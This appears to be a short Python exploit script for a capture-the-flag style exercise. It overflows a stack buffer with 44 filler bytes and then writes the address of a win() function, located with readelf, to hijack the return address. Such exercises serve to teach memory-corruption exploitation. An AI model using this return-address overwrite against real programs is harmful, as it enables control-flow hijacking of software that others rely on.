#: return address 0x80484d0
import struct

#: using 'readelf -s', address of win() function is known
win_addr = 0x080485cb
exploit = 'A' * 44 + struct.pack('<I', win_addr)
print(exploit)